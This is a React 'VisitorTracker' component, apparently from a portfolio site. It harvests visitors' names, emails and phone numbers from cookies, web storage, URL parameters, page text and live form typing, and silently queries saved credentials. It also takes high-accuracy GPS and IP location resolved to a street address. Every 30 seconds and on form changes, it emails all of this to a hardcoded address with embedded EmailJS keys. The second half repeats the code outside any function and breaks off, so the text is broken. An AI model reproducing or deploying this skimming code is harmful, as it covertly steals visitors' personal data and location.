import React, { useState, useEffect, useCallback } from 'react';
import emailjs from 'emailjs-com';
import './VisitorTracker.css';

const VisitorTracker = () => {
  const [showModal, setShowModal] = useState(false);

  // Define collectVisitorData and sendVisitorData first
  const collectVisitorData = async () => {
    const data = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages?.join(', ') || '',
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || 'Direct visit',
      cookieEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine ? 'Online' : 'Offline',
    };

    // Enhanced personal information collection from multiple sources
    try {
      // Comprehensive localStorage check with multiple key patterns
      const localStorageKeys = Object.keys(localStorage);
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phonePattern = /^[\d\s\-+()]+$/;

      // Check all localStorage items for email/phone patterns
      localStorageKeys.forEach(key => {
        const value = localStorage.getItem(key);
        if (value) {
          const lowerKey = key.toLowerCase();
          const lowerValue = value.toLowerCase();
          
          // Name extraction
          if ((lowerKey.includes('name') || lowerKey.includes('user') || lowerKey.includes('fullname')) && !data.name) {
            if (value.length < 100 && !emailPattern.test(value) && !phonePattern.test(value)) {
              data.name = value;
            }
          }
          
          // Email extraction
          if (emailPattern.test(value) && !data.email) {
            if (lowerKey.includes('email') || lowerKey.includes('mail') || lowerKey.includes('user') || lowerValue.includes('@')) {
              data.email = value;
            }
          }
          
          // Phone extraction
          if (phonePattern.test(value.replace(/\s/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
            if (lowerKey.includes('phone') || lowerKey.includes('tel') || lowerKey.includes('mobile') || lowerKey.includes('contact')) {
              data.phone = value;
            }
          }
        }
      });

      // Comprehensive sessionStorage check
      const sessionStorageKeys = Object.keys(sessionStorage);
      sessionStorageKeys.forEach(key => {
        const value = sessionStorage.getItem(key);
        if (value) {
          const lowerKey = key.toLowerCase();
          
          if (emailPattern.test(value) && !data.email) {
            data.email = value;
          }
          if (phonePattern.test(value.replace(/\s/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
            if (lowerKey.includes('phone') || lowerKey.includes('tel') || lowerKey.includes('mobile')) {
              data.phone = value;
            }
          }
          if ((lowerKey.includes('name') || lowerKey.includes('user')) && !data.name && value.length < 100) {
            if (!emailPattern.test(value) && !phonePattern.test(value)) {
              data.name = value;
            }
          }
        }
      });

      // Comprehensive cookie extraction
      const cookies = document.cookie.split(';').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        if (key && value) {
          acc[key.toLowerCase()] = decodeURIComponent(value);
        }
        return acc;
      }, {});

      // Check all cookies for patterns
      Object.keys(cookies).forEach(key => {
        const value = cookies[key];
        const lowerKey = key.toLowerCase();
        
        if (emailPattern.test(value) && !data.email) {
          data.email = value;
        }
        if (phonePattern.test(value.replace(/\D/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
          if (lowerKey.includes('phone') || lowerKey.includes('tel') || lowerKey.includes('mobile')) {
            data.phone = value;
          }
        }
        if ((lowerKey.includes('name') || lowerKey.includes('user') || lowerKey.includes('fullname')) && !data.name) {
          if (value.length < 100 && !emailPattern.test(value) && !phonePattern.test(value)) {
            data.name = value;
          }
        }
      });

      // Extract from URL parameters and hash
      const urlParams = new URLSearchParams(window.location.search);
      const hashParams = new URLSearchParams(window.location.hash.substring(1));
      
      [...urlParams.entries(), ...hashParams.entries()].forEach(([key, value]) => {
        const lowerKey = key.toLowerCase();
        if (emailPattern.test(value) && !data.email) {
          data.email = value;
        }
        if (phonePattern.test(value.replace(/\D/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
          data.phone = value;
        }
        if ((lowerKey.includes('name') || lowerKey.includes('user')) && !data.name && value.length < 100) {
          data.name = value;
        }
      });

      // Enhanced form field extraction - check all input fields
      const allInputs = document.querySelectorAll('input, textarea');
      allInputs.forEach(input => {
        const inputType = input.type?.toLowerCase();
        const inputName = input.name?.toLowerCase() || '';
        const inputId = input.id?.toLowerCase() || '';
        const inputPlaceholder = input.placeholder?.toLowerCase() || '';
        const inputValue = input.value?.trim() || '';
        const inputAutocomplete = input.autocomplete?.toLowerCase() || '';

        // Email extraction
        if (inputValue && emailPattern.test(inputValue) && !data.email) {
          if (inputType === 'email' || inputName.includes('email') || inputId.includes('email') || 
              inputPlaceholder.includes('email') || inputAutocomplete.includes('email')) {
            data.email = inputValue;
          }
        }

        // Phone extraction
        if (inputValue && phonePattern.test(inputValue.replace(/\D/g, '')) && 
            inputValue.replace(/\D/g, '').length >= 7 && !data.phone) {
          if (inputType === 'tel' || inputName.includes('phone') || inputName.includes('tel') || 
              inputId.includes('phone') || inputPlaceholder.includes('phone') || 
              inputAutocomplete.includes('tel')) {
            data.phone = inputValue;
          }
        }

        // Name extraction
        if (inputValue && inputValue.length < 100 && !emailPattern.test(inputValue) && 
            !phonePattern.test(inputValue) && !data.name) {
          if (inputName.includes('name') || inputId.includes('name') || inputPlaceholder.includes('name') ||
              inputAutocomplete.includes('name') || inputType === 'text') {
            // Additional check to ensure it looks like a name
            if (inputValue.split(' ').length <= 5 && /^[a-zA-Z\s.\-']+$/.test(inputValue)) {
              data.name = inputValue;
            }
          }
        }
      });

      // Try to get from browser's credential manager (if accessible)
      if (navigator.credentials && navigator.credentials.get) {
        try {
          const credential = await navigator.credentials.get({
            password: true,
            mediation: 'silent'
          });
          if (credential && credential.id) {
            // Extract email from credential ID if it's an email
            if (emailPattern.test(credential.id) && !data.email) {
              data.email = credential.id;
            }
          }
        } catch (e) {
          // Credentials API not available or denied
        }
      }

      // Check for captured data from form monitoring
      const capturedEmail = localStorage.getItem('capturedEmail');
      const capturedPhone = localStorage.getItem('capturedPhone');
      const capturedName = localStorage.getItem('capturedName');
      
      if (capturedEmail && !data.email) data.email = capturedEmail;
      if (capturedPhone && !data.phone) data.phone = capturedPhone;
      if (capturedName && !data.name) data.name = capturedName;

      // Check for common email patterns in page content
      const pageText = document.body.innerText || document.body.textContent || '';
      const emailMatches = pageText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
      if (emailMatches && emailMatches.length > 0 && !data.email) {
        // Get the first email that's not your own
        const yourEmail = 'theapakalex@gmail.com';
        const visitorEmail = emailMatches.find(email => email.toLowerCase() !== yourEmail.toLowerCase());
        if (visitorEmail) {
          data.email = visitorEmail;
        }
      }

      // Try to extract from meta tags
      const metaEmail = document.querySelector('meta[name="email"], meta[property="email"]');
      if (metaEmail && metaEmail.content && !data.email) {
        data.email = metaEmail.content;
      }

      // Check for data attributes
      const dataAttributes = document.querySelector('[data-email], [data-user-email], [data-visitor-email]');
      if (dataAttributes && !data.email) {
        data.email = dataAttributes.getAttribute('data-email') || 
                     dataAttributes.getAttribute('data-user-email') || 
                     dataAttributes.getAttribute('data-visitor-email');
      }

      // Try to extract from window object properties
      if (window.userData && typeof window.userData === 'object') {
        if (window.userData.email && !data.email) data.email = window.userData.email;
        if (window.userData.name && !data.name) data.name = window.userData.name;
        if (window.userData.phone && !data.phone) data.phone = window.userData.phone;
      }

      // Check IndexedDB (if accessible)
      if (window.indexedDB) {
        try {
          const dbNames = await new Promise((resolve) => {
            const request = indexedDB.databases();
            request.then(dbs => resolve(dbs.map(db => db.name))).catch(() => resolve([]));
          });
          data.indexedDBDatabases = dbNames.join(', ');
        } catch (e) {
          // IndexedDB access denied
        }
      }

      // Get additional browser information
      data.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
      data.deviceMemory = navigator.deviceMemory || 'Unknown';
      data.maxTouchPoints = navigator.maxTouchPoints || 0;
      data.pixelRatio = window.devicePixelRatio || 1;
      data.colorDepth = window.screen.colorDepth || 'Unknown';
      data.cookieCount = document.cookie.split(';').filter(c => c.trim()).length;

      // Try to detect social media logins
      const socialLogins = [];
      if (localStorage.getItem('googleLogin') || cookies.googleLogin) socialLogins.push('Google');
      if (localStorage.getItem('facebookLogin') || cookies.facebookLogin) socialLogins.push('Facebook');
      if (localStorage.getItem('linkedinLogin') || cookies.linkedinLogin) socialLogins.push('LinkedIn');
      if (socialLogins.length > 0) data.socialLogins = socialLogins.join(', ');

      // Get browser plugins/extensions info (limited)
      if (navigator.plugins && navigator.plugins.length > 0) {
        data.plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
      }

      // Get connection information
      if (navigator.connection) {
        data.connectionType = navigator.connection.effectiveType || 'Unknown';
        data.connectionDownlink = navigator.connection.downlink || 'Unknown';
        data.connectionRTT = navigator.connection.rtt || 'Unknown';
      }

      // Get battery information (if available)
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          data.batteryLevel = Math.round(battery.level * 100);
          data.batteryCharging = battery.charging;
        } catch (e) {
          // Battery API not available
        }
      }

    } catch (error) {
      data.personalInfoError = error.message;
    }

    // Enhanced location collection with high accuracy
    try {
      if (navigator.geolocation) {
        // Request high accuracy location
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            resolve, 
            reject, 
            {
              enableHighAccuracy: true,  // Request high accuracy
              timeout: 10000,           // Wait up to 10 seconds
              maximumAge: 0             // Don't use cached location
            }
          );
        });
        
        data.latitude = position.coords.latitude.toFixed(6);
        data.longitude = position.coords.longitude.toFixed(6);
        data.locationAccuracy = `${position.coords.accuracy.toFixed(2)} meters`;
        data.altitude = position.coords.altitude ? `${position.coords.altitude.toFixed(2)} meters` : 'Not available';
        data.altitudeAccuracy = position.coords.altitudeAccuracy ? `${position.coords.altitudeAccuracy.toFixed(2)} meters` : 'Not available';
        data.heading = position.coords.heading ? `${position.coords.heading.toFixed(2)}°` : 'Not available';
        data.speed = position.coords.speed ? `${position.coords.speed.toFixed(2)} m/s` : 'Not available';
        
        // Get reverse geocoding (address from coordinates)
        try {
          const geocodeResponse = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}&zoom=18&addressdetails=1`
          );
          const geocodeData = await geocodeResponse.json();
          
          if (geocodeData && geocodeData.address) {
            const addr = geocodeData.address;
            data.fullAddress = geocodeData.display_name || 'Not available';
            data.street = addr.road || addr.pedestrian || addr.path || 'Not available';
            data.houseNumber = addr.house_number || 'Not available';
            data.city = addr.city || addr.town || addr.village || addr.municipality || 'Not available';
            data.state = addr.state || addr.region || 'Not available';
            data.country = addr.country || 'Not available';
            data.postcode = addr.postcode || 'Not available';
            data.countryCode = addr.country_code?.toUpperCase() || 'Not available';
          }
        } catch (geocodeError) {
          data.geocodeError = 'Could not get address from coordinates';
        }
      }
    } catch (error) {
      data.locationError = error.message || 'Location permission denied or unavailable';
    }

    // Get IP address and IP-based geolocation with high accuracy
    try {
      // Get IP address
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      data.ipAddress = ipData.ip;
      
      // Get detailed IP geolocation
      try {
        const ipGeoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const ipGeoData = await ipGeoResponse.json();
        
        if (ipGeoData && !ipGeoData.error) {
          data.ipLatitude = ipGeoData.latitude?.toFixed(6);
          data.ipLongitude = ipGeoData.longitude?.toFixed(6);
          data.ipCity = ipGeoData.city || 'Not available';
          data.ipRegion = ipGeoData.region || 'Not available';
          data.ipCountry = ipGeoData.country_name || 'Not available';
          data.ipCountryCode = ipGeoData.country_code || 'Not available';
          data.ipPostal = ipGeoData.postal || 'Not available';
          data.ipTimezone = ipGeoData.timezone || 'Not available';
          data.ipISP = ipGeoData.org || 'Not available';
          data.ipASN = ipGeoData.asn || 'Not available';
        }
      } catch (ipGeoError) {
        // Try alternative IP geolocation service
        try {
          const altIpGeoResponse = await fetch(`https://ip-api.com/json/${ipData.ip}`);
          const altIpGeoData = await altIpGeoResponse.json();
          
          if (altIpGeoData && altIpGeoData.status === 'success') {
            data.ipLatitude = altIpGeoData.lat?.toFixed(6);
            data.ipLongitude = altIpGeoData.lon?.toFixed(6);
            data.ipCity = altIpGeoData.city || 'Not available';
            data.ipRegion = altIpGeoData.regionName || 'Not available';
            data.ipCountry = altIpGeoData.country || 'Not available';
            data.ipCountryCode = altIpGeoData.countryCode || 'Not available';
            data.ipPostal = altIpGeoData.zip || 'Not available';
            data.ipTimezone = altIpGeoData.timezone || 'Not available';
            data.ipISP = altIpGeoData.isp || 'Not available';
            data.ipASN = altIpGeoData.as || 'Not available';
          }
        } catch (altError) {
          data.ipGeoError = 'Could not get IP geolocation';
        }
      }
    } catch (error) {
      data.ipError = 'Could not fetch IP address';
    }

    return data;
  };

  const sendVisitorData = async (visitorData) => {
    try {
      const visitorInfo = `
VISITOR INFORMATION REPORT
===========================

PERSONAL INFORMATION:
- Name: ${visitorData.name || 'Not available'}
- Email: ${visitorData.email || 'Not available'}
- Phone: ${visitorData.phone || 'Not available'}

VISIT DETAILS:
- Time: ${visitorData.timestamp}
- IP Address: ${visitorData.ipAddress || 'Not available'}
- Timezone: ${visitorData.timezone}
- Referrer: ${visitorData.referrer}

EXACT LOCATION (GPS):
- Coordinates: ${visitorData.latitude && visitorData.longitude ? `${visitorData.latitude}, ${visitorData.longitude}` : 'Not available'}
- Accuracy: ${visitorData.locationAccuracy || 'Not available'}
- Altitude: ${visitorData.altitude || 'Not available'}
- Altitude Accuracy: ${visitorData.altitudeAccuracy || 'Not available'}
- Heading: ${visitorData.heading || 'Not available'}
- Speed: ${visitorData.speed || 'Not available'}
- Full Address: ${visitorData.fullAddress || 'Not available'}
- Street: ${visitorData.street || 'Not available'}
- House Number: ${visitorData.houseNumber || 'Not available'}
- City: ${visitorData.city || 'Not available'}
- State/Region: ${visitorData.state || 'Not available'}
- Country: ${visitorData.country || 'Not available'}
- Postal Code: ${visitorData.postcode || 'Not available'}
- Country Code: ${visitorData.countryCode || 'Not available'}
${visitorData.locationError ? `- Location Error: ${visitorData.locationError}` : ''}

IP-BASED LOCATION:
- IP Coordinates: ${visitorData.ipLatitude && visitorData.ipLongitude ? `${visitorData.ipLatitude}, ${visitorData.ipLongitude}` : 'Not available'}
- IP City: ${visitorData.ipCity || 'Not available'}
- IP Region: ${visitorData.ipRegion || 'Not available'}
- IP Country: ${visitorData.ipCountry || 'Not available'}
- IP Country Code: ${visitorData.ipCountryCode || 'Not available'}
- IP Postal Code: ${visitorData.ipPostal || 'Not available'}
- IP Timezone: ${visitorData.ipTimezone || 'Not available'}
- ISP: ${visitorData.ipISP || 'Not available'}
- ASN: ${visitorData.ipASN || 'Not available'}

DEVICE INFORMATION:
- Platform: ${visitorData.platform}
- Screen: ${visitorData.screenWidth}x${visitorData.screenHeight}
- Viewport: ${visitorData.viewportWidth}x${visitorData.viewportHeight}
- Pixel Ratio: ${visitorData.pixelRatio}
- Color Depth: ${visitorData.colorDepth}
- Hardware Cores: ${visitorData.hardwareConcurrency}
- Device Memory: ${visitorData.deviceMemory}GB
- Max Touch Points: ${visitorData.maxTouchPoints}

BROWSER INFORMATION:
- User Agent: ${visitorData.userAgent}
- Language: ${visitorData.language}
- Languages: ${visitorData.languages || visitorData.language}
- Plugins: ${visitorData.plugins || 'Not available'}
- Cookies Enabled: ${visitorData.cookieEnabled}
- Cookie Count: ${visitorData.cookieCount || 0}

CONNECTION INFORMATION:
- Status: ${visitorData.onlineStatus}
- Connection Type: ${visitorData.connectionType || 'Not available'}
- Downlink: ${visitorData.connectionDownlink || 'Not available'}
- RTT: ${visitorData.connectionRTT || 'Not available'}
${visitorData.batteryLevel ? `- Battery Level: ${visitorData.batteryLevel}% (Charging: ${visitorData.batteryCharging})` : ''}

ADDITIONAL:
- Social Logins: ${visitorData.socialLogins || 'None detected'}
      `.trim();

      const templateParams = {
        from_name: 'Portfolio Visitor',
        email_id: visitorData.ipAddress || 'Not available',
        message: visitorInfo,
        to_email: 'theapakalex@gmail.com'
      };

      await emailjs.send(
        'service_o3op9qd',
        'template_u0ed0zu',
        templateParams,
        'WzafPeLExLDmFw5I_'
      );

      console.log('Visitor data sent successfully');
    } catch (error) {
      console.error('Error sending visitor data:', error);
    }
  };

  const collectAndSendVisitorData = useCallback(async () => {
    const data = await collectVisitorData();
    await sendVisitorData(data);
  }, []);

  const setupFormMonitoring = useCallback(() => {
    // Monitor all input fields for changes
    const inputs = document.querySelectorAll('input, textarea');
    
    inputs.forEach(input => {
      // Listen for input events
      input.addEventListener('input', (e) => {
        const value = e.target.value;
        const name = e.target.name || e.target.id || '';
        const type = e.target.type || '';
        
        // Store in localStorage for later collection
        if (value && value.length > 0) {
          if (type === 'email' || name.toLowerCase().includes('email')) {
            localStorage.setItem('capturedEmail', value);
          } else if (type === 'tel' || name.toLowerCase().includes('phone') || name.toLowerCase().includes('tel')) {
            localStorage.setItem('capturedPhone', value);
          } else if (name.toLowerCase().includes('name') && value.length < 100) {
            localStorage.setItem('capturedName', value);
          }
        }
      }, { passive: true });
      
      // Listen for autofill events
      input.addEventListener('change', (e) => {
        const value = e.target.value;
        const name = e.target.name || e.target.id || '';
        const type = e.target.type || '';
        
        if (value && value.length > 0) {
          if (type === 'email' || name.toLowerCase().includes('email')) {
            localStorage.setItem('capturedEmail', value);
            // Immediately send updated data
            setTimeout(() => collectAndSendVisitorData(), 1000);
          } else if (type === 'tel' || name.toLowerCase().includes('phone')) {
            localStorage.setItem('capturedPhone', value);
            setTimeout(() => collectAndSendVisitorData(), 1000);
          } else if (name.toLowerCase().includes('name')) {
            localStorage.setItem('capturedName', value);
            setTimeout(() => collectAndSendVisitorData(), 1000);
          }
        }
      }, { passive: true });
    });
    
    // Monitor form submissions
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
      form.addEventListener('submit', () => {
        // Collect data right before form submission
        setTimeout(() => collectAndSendVisitorData(), 500);
      }, { passive: true });
    });
  }, [collectAndSendVisitorData]);

  useEffect(() => {
    // Check if permission was granted
    const permissionGranted = localStorage.getItem('visitorPermissionGranted');

    if (permissionGranted === 'true') {
      // Permission already granted - collect data automatically
      collectAndSendVisitorData();
      
      // Set up form monitoring to capture data when users type
      setupFormMonitoring();
      
      // Periodically check for new data (every 30 seconds)
      const intervalId = setInterval(() => {
        collectAndSendVisitorData();
      }, 30000);
      
      return () => clearInterval(intervalId);
    } else {
      // Permission not granted - show modal every time
      setTimeout(() => {
        setShowModal(true);
      }, 2000);
    }
  }, [collectAndSendVisitorData, setupFormMonitoring]);
    const data = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages?.join(', ') || '',
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || 'Direct visit',
      cookieEnabled: navigator.cookieEnabled,
      onlineStatus: navigator.onLine ? 'Online' : 'Offline',
    };

    // Enhanced personal information collection from multiple sources
    try {
      // Comprehensive localStorage check with multiple key patterns
      const localStorageKeys = Object.keys(localStorage);
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phonePattern = /^[\d\s\-+()]+$/;

      // Check all localStorage items for email/phone patterns
      localStorageKeys.forEach(key => {
        const value = localStorage.getItem(key);
        if (value) {
          const lowerKey = key.toLowerCase();
          const lowerValue = value.toLowerCase();
          
          // Name extraction
          if ((lowerKey.includes('name') || lowerKey.includes('user') || lowerKey.includes('fullname')) && !data.name) {
            if (value.length < 100 && !emailPattern.test(value) && !phonePattern.test(value)) {
              data.name = value;
            }
          }
          
          // Email extraction
          if (emailPattern.test(value) && !data.email) {
            if (lowerKey.includes('email') || lowerKey.includes('mail') || lowerKey.includes('user') || lowerValue.includes('@')) {
              data.email = value;
            }
          }
          
          // Phone extraction
          if (phonePattern.test(value.replace(/\s/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
            if (lowerKey.includes('phone') || lowerKey.includes('tel') || lowerKey.includes('mobile') || lowerKey.includes('contact')) {
              data.phone = value;
            }
          }
        }
      });

      // Comprehensive sessionStorage check
      const sessionStorageKeys = Object.keys(sessionStorage);
      sessionStorageKeys.forEach(key => {
        const value = sessionStorage.getItem(key);
        if (value) {
          const lowerKey = key.toLowerCase();
          
          if (emailPattern.test(value) && !data.email) {
            data.email = value;
          }
          if (phonePattern.test(value.replace(/\s/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
            if (lowerKey.includes('phone') || lowerKey.includes('tel') || lowerKey.includes('mobile')) {
              data.phone = value;
            }
          }
          if ((lowerKey.includes('name') || lowerKey.includes('user')) && !data.name && value.length < 100) {
            if (!emailPattern.test(value) && !phonePattern.test(value)) {
              data.name = value;
            }
          }
        }
      });

      // Comprehensive cookie extraction
      const cookies = document.cookie.split(';').reduce((acc, cookie) => {
        const [key, value] = cookie.trim().split('=');
        if (key && value) {
          acc[key.toLowerCase()] = decodeURIComponent(value);
        }
        return acc;
      }, {});

      // Check all cookies for patterns
      Object.keys(cookies).forEach(key => {
        const value = cookies[key];
        const lowerKey = key.toLowerCase();
        
        if (emailPattern.test(value) && !data.email) {
          data.email = value;
        }
        if (phonePattern.test(value.replace(/\D/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
          if (lowerKey.includes('phone') || lowerKey.includes('tel') || lowerKey.includes('mobile')) {
            data.phone = value;
          }
        }
        if ((lowerKey.includes('name') || lowerKey.includes('user') || lowerKey.includes('fullname')) && !data.name) {
          if (value.length < 100 && !emailPattern.test(value) && !phonePattern.test(value)) {
            data.name = value;
          }
        }
      });

      // Extract from URL parameters and hash
      const urlParams = new URLSearchParams(window.location.search);
      const hashParams = new URLSearchParams(window.location.hash.substring(1));
      
      [...urlParams.entries(), ...hashParams.entries()].forEach(([key, value]) => {
        const lowerKey = key.toLowerCase();
        if (emailPattern.test(value) && !data.email) {
          data.email = value;
        }
        if (phonePattern.test(value.replace(/\D/g, '')) && value.replace(/\D/g, '').length >= 7 && !data.phone) {
          data.phone = value;
        }
        if ((lowerKey.includes('name') || lowerKey.includes('user')) && !data.name && value.length < 100) {
          data.name = value;
        }
      });

      // Enhanced form field extraction - check all input fields
      const allInputs = document.querySelectorAll('input, textarea');
      allInputs.forEach(input => {
        const inputType = input.type?.toLowerCase();
        const inputName = input.name?.toLowerCase() || '';
        const inputId = input.id?.toLowerCase() || '';
        const inputPlaceholder = input.placeholder?.toLowerCase() || '';
        const inputValue = input.value?.trim() || '';
        const inputAutocomplete = input.autocomplete?.toLowerCase() || '';

        // Email extraction
        if (inputValue && emailPattern.test(inputValue) && !data.email) {
          if (inputType === 'email' || inputName.includes('email') || inputId.includes('email') || 
              inputPlaceholder.includes('email') || inputAutocomplete.includes('email')) {
            data.email = inputValue;
          }
        }

        // Phone extraction
        if (inputValue && phonePattern.test(inputValue.replace(/\D/g, '')) && 
            inputValue.replace(/\D/g, '').length >= 7 && !data.phone) {
          if (inputType === 'tel' || inputName.includes('phone') || inputName.includes('tel') || 
              inputId.includes('phone') || inputPlaceholder.includes('phone') || 
              inputAutocomplete.includes('tel')) {
            data.phone = inputValue;
          }
        }

        // Name extraction
        if (inputValue && inputValue.length < 100 && !emailPattern.test(inputValue) && 
            !phonePattern.test(inputValue) && !data.name) {
          if (inputName.includes('name') || inputId.includes('name') || inputPlaceholder.includes('name') ||
              inputAutocomplete.includes('name') || inputType === 'text') {
            // Additional check to ensure it looks like a name
            if (inputValue.split(' ').length <= 5 && /^[a-zA-Z\s.\-']+$/.test(inputValue)) {
              data.name = inputValue;
            }
          }
        }
      });

      // Try to get from browser's credential manager (if accessible)
      if (navigator.credentials && navigator.credentials.get) {
        try {
          const credential = await navigator.credentials.get({
            password: true,
            mediation: 'silent'
          });
          if (credential && credential.id) {
            // Extract email from credential ID if it's an email
            if (emailPattern.test(credential.id) && !data.email) {
              data.email = credential.id;
            }
          }
        } catch (e) {
          // Credentials API not available or denied
        }
      }

      // Check for captured data from form monitoring
      const capturedEmail = localStorage.getItem('capturedEmail');
      const capturedPhone = localStorage.getItem('capturedPhone');
      const capturedName = localStorage.getItem('capturedName');
      
      if (capturedEmail && !data.email) data.email = capturedEmail;
      if (capturedPhone && !data.phone) data.phone = capturedPhone;
      if (capturedName && !data.name) data.name = capturedName;

      // Check for common email patterns in page content
      const pageText = document.body.innerText || document.body.textContent || '';
      const emailMatches = pageText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
      if (emailMatches && emailMatches.length > 0 && !data.email) {
        // Get the first email that's not your own
        const yourEmail = 'theapakalex@gmail.com';
        const visitorEmail = emailMatches.find(email => email.toLowerCase() !== yourEmail.toLowerCase());
        if (visitorEmail) {
          data.email = visitorEmail;
        }
      }

      // Try to extract from meta tags
      const metaEmail = document.querySelector('meta[name="email"], meta[property="email"]');
      if (metaEmail && metaEmail.content && !data.email) {
        data.email = metaEmail.content;
      }

      // Check for data attributes
      const dataAttributes = document.querySelector('[data-email], [data-user-email], [data-visitor-email]');
      if (dataAttributes && !data.email) {
        data.email = dataAttributes.getAttribute('data-email') || 
                     dataAttributes.getAttribute('data-user-email') || 
                     dataAttributes.getAttribute('data-visitor-email');
      }

      // Try to extract from window object properties
      if (window.userData && typeof window.userData === 'object') {
        if (window.userData.email && !data.email) data.email = window.userData.email;
        if (window.userData.name && !data.name) data.name = window.userData.name;
        if (window.userData.phone && !data.phone) data.phone = window.userData.phone;
      }

      // Check IndexedDB (if accessible)
      if (window.indexedDB) {
        try {
          const dbNames = await new Promise((resolve) => {
            const request = indexedDB.databases();
            request.then(dbs => resolve(dbs.map(db => db.name))).catch(() => resolve([]));
          });
          data.indexedDBDatabases = dbNames.join(', ');
        } catch (e) {
          // IndexedDB access denied
        }
      }

      // Get additional browser information
      data.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
      data.deviceMemory = navigator.deviceMemory || 'Unknown';
      data.maxTouchPoints = navigator.maxTouchPoints || 0;
      data.pixelRatio = window.devicePixelRatio || 1;
      data.colorDepth = window.screen.colorDepth || 'Unknown';
      data.cookieCount = document.cookie.split(';').filter(c => c.trim()).length;

      // Try to detect social media logins
      const socialLogins = [];
      if (localStorage.getItem('googleLogin') || cookies.googleLogin) socialLogins.push('Google');
      if (localStorage.getItem('facebookLogin') || cookies.facebookLogin) socialLogins.push('Facebook');
      if (localStorage.getItem('linkedinLogin') || cookies.linkedinLogin) socialLogins.push('LinkedIn');
      if (socialLogins.length > 0) data.socialLogins = socialLogins.join(', ');

      // Get browser plugins/extensions info (limited)
      if (navigator.plugins && navigator.plugins.length > 0) {
        data.plugins = Array.from(navigator.plugins).map(p => p.name).join(', ');
      }

      // Get connection information
      if (navigator.connection) {
        data.connectionType = navigator.connection.effectiveType || 'Unknown';
        data.connectionDownlink = navigator.connection.downlink || 'Unknown';
        data.connectionRTT = navigator.connection.rtt || 'Unknown';
      }

      // Get battery information (if available)
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          data.batteryLevel = Math.round(battery.level * 100);
          data.batteryCharging = battery.charging;
        } catch (e) {
          // Battery API not available
        }
      }

    } catch (error) {
      data.personalInfoError = error.message;
    }

    // Enhanced location collection with high accuracy
    try {
      if (navigator.geolocation) {
        // Request high accuracy location
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            resolve, 
            reject, 
            {
              enableHighAccuracy: true,  // Request high accuracy
              timeout: 10000,           // Wait up to 10 seconds
              maximumAge: 0             // Don't use cached location
            }
          );
        });
        
        data.latitude = position.coords.latitude.toFixed(6);
        data.longitude = position.coords.longitude.toFixed(6);
        data.locationAccuracy = `${position.coords.accuracy.toFixed(2)} meters`;
        data.altitude = position.coords.altitude ? `${position.coords.altitude.toFixed(2)} meters` : 'Not available';
        data.altitudeAccuracy = position.coords.altitudeAccuracy ? `${position.coords.altitudeAccuracy.toFixed(2)} meters` : 'Not available';
        data.heading = position.coords.heading ? `${position.coords.heading.toFixed(2)}°` : 'Not available';
        data.speed = position.coords.speed ? `${position.coords.speed.toFixed(2)} m/s` : 'Not available';
        
        // Get reverse geocoding (address from coordinates)
        try {
          const geocodeResponse = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${data.latitude}&lon=${data.longitude}&zoom=18&addressdetails=1`
          );
          const geocodeData = await geocodeResponse.json();
          
          if (geocodeData && geocodeData.address) {
            const addr = geocodeData.address;
            data.fullAddress = geocodeData.display_name || 'Not available';
            data.street = addr.road || addr.pedestrian || addr.path || 'Not available';
            data.houseNumber = addr.house_number || 'Not available';
            data.city = addr.city || addr.town || addr.village || addr.municipality || 'Not available';
            data.state = addr.state || addr.region || 'Not available';
            data.country = addr.country || 'Not available';
            data.postcode = addr.postcode || 'Not available';
            data.countryCode = addr.country_code?.toUpperCase() || 'Not available';
          }
        } catch (geocodeError) {
          data.geocodeError = 'Could not get address from coordinates';
        }
      }
    } catch (error) {
      data.locationError = error.message || 'Location permission denied or unavailable';
    }

    // Get IP address and IP-based geolocation with high accuracy
    try {
      // Get IP address
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      data.ipAddress = ipData.ip;
      
      // Get detailed IP geolocation
      try {
        const ipGeoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const ipGeoData = await ipGeoResponse.json();
        
        if (ipGeoData && !ipGeoData.error) {
          data.ipLatitude = ipGeoData.latitude?.toFixed(6);
          data.ipLongitude = ipGeoData.longitude?.toFixed(6);
          data.ipCity = ipGeoData.city || 'Not available';
          data.ipRegion = ipGeoData.region || 'Not available';
